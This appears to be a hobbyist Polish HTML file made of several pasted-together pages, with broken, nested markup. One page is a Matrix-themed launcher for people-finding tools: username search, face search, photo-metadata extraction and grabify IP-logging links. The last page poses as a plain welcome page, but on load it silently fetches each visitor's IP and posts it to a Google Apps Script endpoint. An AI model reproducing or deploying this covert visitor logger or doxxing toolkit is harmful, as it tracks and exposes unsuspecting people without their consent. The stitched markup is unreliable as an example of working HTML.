<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Strona z tłem GIF</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: url('backgrundgit/Matrix%20wallpaper%20gif.gif') no-repeat center center fixed;
            background-size: cover;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
        }
    </style>
</head>
<body>

<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Przykładowe Przycisk</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .button {
            padding: 10px 20px;
            font-size: 16px;
            color: white;
            background-color: #282728;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px;
        }
        .button:hover {
            background-color: #3e3e3e;
        }
    </style>
</head>
<body>

<a href="https://whatsmyname.app/" target="_blank">
    <button class="button">Wysz. po nicku</button>
</a>
<a href="https://facecheck.id" target="_blank">
    <button class="button">Wysz. po twarzy</button>
</a>
<a href="https://jimpl.com" target="_blank">
    <button class="button">Inf. ze zdj.</button>
</a>
<a href="https://grabify.link" target="_blank">
    <button class="button">Zbieraczka z linku</button>
</a>
<button class="button" onclick="openAll()">Otwórz wszystko</button>

<script>
function openAll() {
    setTimeout(function() {
        window.open('https://whatsmyname.app/', '_blank');
    }, 1000);

    setTimeout(function() {
        window.open('https://facecheck.id', '_blank');
    }, 3000);

    setTimeout(function() {
        window.open('https://jimpl.com', '_blank');
    }, 5000);

    setTimeout(function() {
        window.open('https://grabify.link', '_blank');
    }, 7500);
}
</script>

</body>
</html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Przykład</title>
</head>
<body>
    <div style="text-align: center;">
        <p style="font-size: 2em; color: green;">BEZPIECZNE</p>
    </div>
</body>


<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moja Strona</title>
    <script>
        async function getIpAndSave() {
            try {
                // Pobranie adresu IP
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const userIp = data.ip;
                // Wyświetlenie IP na stronie
                document.getElementById('ip').textContent = `Twoje IP to: ${userIp}`;
                // Wysłanie IP do Google Sheets
                const postResponse = await fetch('https://script.google.com/macros/s/1rj9SWrv7LE6weqJ_5oFMYE0xMm2y8gmCujET0mchUlo/exec', { // Zastąp YOUR_SCRIPT_ID swoim ID
                    method: 'POST', // Użyj metody POST
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `ip=${userIp}`, // Przesyłanie IP jako parametr
                });
                const result = await postResponse.text(); // Opcjonalnie, możesz chcieć wyświetlić odpowiedź
                console.log(result);
            } catch (error) {
                console.error('Błąd:', error);
            }
        }
        // Uruchomienie funkcji po załadowaniu strony
        window.onload = getIpAndSave;
    </script>
</head>
<body>
    <h1>Witaj na mojej stronie!</h1>
    <p id="ip">Ładowanie IP...</p>
</body>
</html>











